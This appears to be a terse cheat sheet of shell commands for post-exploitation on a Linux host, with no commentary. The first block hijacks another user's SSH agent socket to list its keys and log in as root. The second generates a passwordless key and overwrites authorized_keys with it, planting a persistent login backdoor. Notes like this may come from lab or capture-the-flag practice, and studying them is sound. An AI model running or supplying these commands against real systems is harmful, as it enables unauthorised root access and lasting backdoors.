## command
cd ssh-* && a=$(pwd) && b=$(ls) && SSH_AUTH_SOCK=$a/$b ssh-add -l && SSH_AUTH_SOCK=$a/$b ssh root@localhost


#############
## new key ##
#############
cd ~/.ssh/
ssh-keygen -b 3072 -t rsa -f /tmp/sshkey -q -N ""
cat /tmp/sshkey.pub > authorized_keys
